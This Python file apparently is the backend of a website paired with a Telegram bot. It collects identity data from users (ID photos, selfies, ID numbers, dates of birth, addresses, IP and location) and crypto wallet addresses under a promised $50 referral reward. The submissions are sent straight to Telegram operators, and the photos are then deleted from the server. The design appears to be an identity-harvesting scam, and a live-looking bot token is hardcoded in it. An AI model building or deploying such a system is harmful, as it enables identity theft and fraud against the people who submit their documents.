import os
import sqlite3
import threading
import uuid
import datetime
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.utils import secure_filename
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

app = Flask(__name__, static_folder='.', static_url_path='/')
CORS(app)

DB_FILE = 'database.db'
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

BOT_TOKEN = '8242172399:AAGX5Hto7I8uXpc2Yanuv1lH3egoVhjHSSI'
MAIN_ADMIN_ID = 8367322595
bot = telebot.TeleBot(BOT_TOKEN)

# DB Initialization
def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        name TEXT NOT NULL,
                        email TEXT UNIQUE NOT NULL,
                        password_hash TEXT NOT NULL,
                        token TEXT,
                        balance REAL DEFAULT 0,
                        kyc_status TEXT DEFAULT 'pending_submission',
                        is_admin BOOLEAN DEFAULT FALSE
                    )''')
        c.execute('''CREATE TABLE IF NOT EXISTS referrals (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        user_id INTEGER,
                        wallet_label TEXT NOT NULL,
                        wallet_type TEXT,
                        wallet_address TEXT NOT NULL,
                        status TEXT DEFAULT 'pending',
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        approved_at TIMESTAMP,
                        FOREIGN KEY(user_id) REFERENCES users(id)
                    )''')
        c.execute('''CREATE TABLE IF NOT EXISTS admins (
                        chat_id INTEGER PRIMARY KEY
                    )''')
        
        # Add main admin if not exists
        c.execute("INSERT OR IGNORE INTO admins (chat_id) VALUES (?)", (MAIN_ADMIN_ID,))
        conn.commit()

init_db()

# DB Helpers
def get_db():
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    return conn

def get_user_by_token(token):
    if not token:
        return None
    token = token.replace('Bearer ', '')
    with get_db() as conn:
        user = conn.execute("SELECT * FROM users WHERE token = ?", (token,)).fetchone()
        return dict(user) if user else None

def get_all_admins():
    with get_db() as conn:
        admins = conn.execute("SELECT chat_id FROM admins").fetchall()
        return [admin['chat_id'] for admin in admins]

# FLASK ROUTES -------------

@app.route('/')
def index():
    return app.send_static_file('index.html')
    
@app.route('/login')
def login_page():
    return app.send_static_file('login.html')

@app.route('/register')
def reg_page():
    return app.send_static_file('register.html')

@app.route('/dashboard')
def dashboard_page():
    return app.send_static_file('dashboard.html')

@app.route('/kyc')
def kyc_page():
    return app.send_static_file('kyc.html')

@app.route('/api/register', methods=['POST'])
def api_register():
    data = request.json
    name = data.get('name')
    email = data.get('email')
    password = data.get('password')
    if not all([name, email, password]):
        return jsonify({'error': 'Missing fields'}), 400
    
    hashed = generate_password_hash(password)
    token = str(uuid.uuid4())
    try:
        with get_db() as conn:
            c = conn.cursor()
            c.execute("INSERT INTO users (name, email, password_hash, token) VALUES (?, ?, ?, ?)", (name, email, hashed, token))
            conn.commit()
            return jsonify({'token': token, 'user': {'name': name, 'email': email, 'status': 'pending_submission'}})
    except sqlite3.IntegrityError:
        return jsonify({'error': 'Email already exists'}), 400

@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.json
    email = data.get('email')
    password = data.get('password')
    with get_db() as conn:
        user = conn.execute("SELECT * FROM users WHERE email = ?", (email,)).fetchone()
        if user and check_password_hash(user['password_hash'], password):
            token = str(uuid.uuid4())
            conn.execute("UPDATE users SET token = ? WHERE id = ?", (token, user['id']))
            conn.commit()
            return jsonify({'token': token, 'user': {'name': user['name'], 'email': user['email'], 'status': user['kyc_status'], 'balance': user['balance']}})
    return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/api/me', methods=['GET'])
def api_me():
    user = get_user_by_token(request.headers.get('Authorization'))
    if not user:
        return jsonify({'error': 'Unauthorized'}), 401
    
    # Process referral rewards
    with get_db() as conn:
        refs = conn.execute("SELECT * FROM referrals WHERE user_id = ?", (user['id'],)).fetchall()
        
        # Check 14-day reward logic dynamically
        new_balance = user['balance']
        updated = False
        for ref in refs:
            if ref['status'] == 'approved' and ref['approved_at']:
                extime = datetime.datetime.strptime(ref['approved_at'][:19], "%Y-%m-%d %H:%M:%S")
                if datetime.datetime.now() > extime + datetime.timedelta(days=14):
                    # give $50
                    conn.execute("UPDATE referrals SET status = 'completed' WHERE id = ?", (ref['id'],))
                    new_balance += 50.0
                    updated = True
        if updated:
            conn.execute("UPDATE users SET balance = ? WHERE id = ?", (new_balance, user['id']))
            conn.commit()
            user['balance'] = new_balance

    return jsonify({'user': {'name': user['name'], 'email': user['email'], 'status': user['kyc_status'], 'balance': user['balance']}})

@app.route('/api/referrals', methods=['GET'])
def get_referrals():
    user = get_user_by_token(request.headers.get('Authorization'))
    if not user:
        return jsonify({'error': 'Unauthorized'}), 401
    with get_db() as conn:
        refs = conn.execute("SELECT wallet_label, wallet_type, wallet_address, status, created_at FROM referrals WHERE user_id = ?", (user['id'],)).fetchall()
        return jsonify([dict(r) for r in refs])

@app.route('/api/referrals', methods=['POST'])
def add_referral():
    user = get_user_by_token(request.headers.get('Authorization'))
    if not user:
        return jsonify({'error': 'Unauthorized'}), 401
    data = request.json
    label = data.get('wallet_label')
    type_ = data.get('wallet_type')
    address = data.get('wallet_address')
    
    with get_db() as conn:
        c = conn.cursor()
        c.execute("INSERT INTO referrals (user_id, wallet_label, wallet_type, wallet_address) VALUES (?, ?, ?, ?)", 
                  (user['id'], label, type_, address))
        ref_id = c.lastrowid
        conn.commit()
        
    # Notify Admins via Telegram
    msg = f"📌 <b>New Referral Added</b>\n👤 User: {user['name']} ({user['email']})\n🏷 Label: {label}\n💼 Wallet: {type_} - {address}"
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("Approve", callback_data=f"ref_approve_{ref_id}"),
               InlineKeyboardButton("Reject", callback_data=f"ref_reject_{ref_id}"))
    
    for admin_id in get_all_admins():
        try:
            bot.send_message(admin_id, msg, parse_mode='HTML', reply_markup=markup)
        except Exception:
            pass

    return jsonify({'success': True, 'status': 'pending'})

@app.route('/api/kyc', methods=['POST'])
def submit_kyc():
    user = get_user_by_token(request.headers.get('Authorization'))
    if not user:
        return jsonify({'error': 'Unauthorized'}), 401
        
    name = request.form.get('name')
    dob = request.form.get('dob')
    address = request.form.get('address')
    id_card = request.form.get('id_card')
    phone = request.form.get('phone')
    email = request.form.get('email')
    telegram = request.form.get('telegram', '')
    client_ip = request.form.get('client_ip', request.remote_addr or 'unknown')
    client_geo = request.form.get('client_geo', 'unknown')
    
    id_photo = request.files.get('id_photo')
    selfie = request.files.get('selfie')
    
    if not all([name, dob, address, id_card, phone, email, id_photo, selfie]):
        return jsonify({'error': 'Missing fields or files'}), 400
        
    id_name = secure_filename(id_photo.filename)
    selfie_name = secure_filename(selfie.filename)
    id_path = os.path.join(UPLOAD_FOLDER, f"{uuid.uuid4()}_{id_name}")
    selfie_path = os.path.join(UPLOAD_FOLDER, f"{uuid.uuid4()}_{selfie_name}")
    
    id_photo.save(id_path)
    selfie.save(selfie_path)
    
    with get_db() as conn:
        conn.execute("UPDATE users SET kyc_status = 'pending_approval' WHERE id = ?", (user['id'],))
        conn.commit()
    
    # Notify Admins via Telegram
    msg = (f"🛡 <b>New KYC Application</b>\n"
           f"👤 Site User ID: {user['id']}\n"
           f"Name: {name}\n"
           f"DOB: {dob}\n"
           f"Address: {address}\n"
           f"ID Number: {id_card}\n"
           f"Phone: {phone}\n"
           f"Email: {email}\n"
           f"Telegram: {telegram}\n"
           f"─────────────────\n"
           f"🌐 IP: <code>{client_ip}</code>\n"
           f"📍 GEO: {client_geo}")
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("Approve", callback_data=f"kyc_approve_{user['id']}"),
               InlineKeyboardButton("Reject", callback_data=f"kyc_reject_{user['id']}"))
               
    for admin_id in get_all_admins():
        try:
            with open(id_path, 'rb') as f1, open(selfie_path, 'rb') as f2:
                from telebot.types import InputMediaPhoto
                bot.send_media_group(admin_id, [InputMediaPhoto(f1), InputMediaPhoto(f2)])
            bot.send_message(admin_id, msg, parse_mode='HTML', reply_markup=markup)
        except Exception as e:
            print(f"Error sending KYC to bot: {e}")

    # Optionally delete photos immediately to save space
    os.remove(id_path)
    os.remove(selfie_path)

    return jsonify({'success': True, 'status': 'pending_approval'})


# BOT CALLBACKS AND HANDLERS ----------

@bot.message_handler(commands=['start'])
def bot_start(message):
    bot.reply_to(message, "KYC & Referral Management Bot running.\nUse /addadmin <id> to add moderators.")

@bot.message_handler(commands=['addadmin'])
def bot_add_admin(message):
    if message.chat.id != MAIN_ADMIN_ID:
        bot.reply_to(message, "You are not the main admin.")
        return
        
    try:
        new_id = int(message.text.split()[1])
        with get_db() as conn:
            conn.execute("INSERT OR IGNORE INTO admins (chat_id) VALUES (?)", (new_id,))
            conn.commit()
        bot.reply_to(message, f"Admin {new_id} added.")
    except Exception:
        bot.reply_to(message, "Usage: /addadmin <User ID>")

@bot.callback_query_handler(func=lambda call: True)
def bot_callback(call):
    admin_id = call.message.chat.id
    if admin_id not in get_all_admins():
        bot.answer_callback_query(call.id, "Unauthorized.")
        return
        
    data = call.data
    conn = get_db()
    c = conn.cursor()
    
    if data.startswith("kyc_approve_"):
        uid = data.split('_')[2]
        c.execute("UPDATE users SET kyc_status = 'approved' WHERE id = ?", (uid,))
        conn.commit()
        bot.edit_message_text(f"{call.message.text}\n\n✅ <b>APPROVED KYC</b>", admin_id, call.message.message_id, parse_mode='HTML')
        bot.answer_callback_query(call.id, "KYC Approved.")
        
    elif data.startswith("kyc_reject_"):
        uid = data.split('_')[2]
        c.execute("UPDATE users SET kyc_status = 'rejected' WHERE id = ?", (uid,))
        conn.commit()
        bot.edit_message_text(f"{call.message.text}\n\n❌ <b>REJECTED KYC</b>", admin_id, call.message.message_id, parse_mode='HTML')
        bot.answer_callback_query(call.id, "KYC Rejected.")
        
    elif data.startswith("ref_approve_"):
        ref_id = data.split('_')[2]
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        c.execute("UPDATE referrals SET status = 'approved', approved_at = ? WHERE id = ?", (now, ref_id))
        conn.commit()
        bot.edit_message_text(f"{call.message.text}\n\n✅ <b>APPROVED REFERRAL (14 Days started)</b>", admin_id, call.message.message_id, parse_mode='HTML')
        bot.answer_callback_query(call.id, "Referral Approved.")
        
    elif data.startswith("ref_reject_"):
        ref_id = data.split('_')[2]
        c.execute("UPDATE referrals SET status = 'rejected' WHERE id = ?", (ref_id,))
        conn.commit()
        bot.edit_message_text(f"{call.message.text}\n\n❌ <b>REJECTED REFERRAL</b>", admin_id, call.message.message_id, parse_mode='HTML')
        bot.answer_callback_query(call.id, "Referral Rejected.")
        
    conn.close()

if __name__ == '__main__':
    # Initialize DB
    init_db()
    
    # Start bot in a background thread
    threading.Thread(target=bot.infinity_polling, daemon=True).start()
    
    # Start Flask API
    # In production with Gunicorn, this app.run() is ignored if imported as a module
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

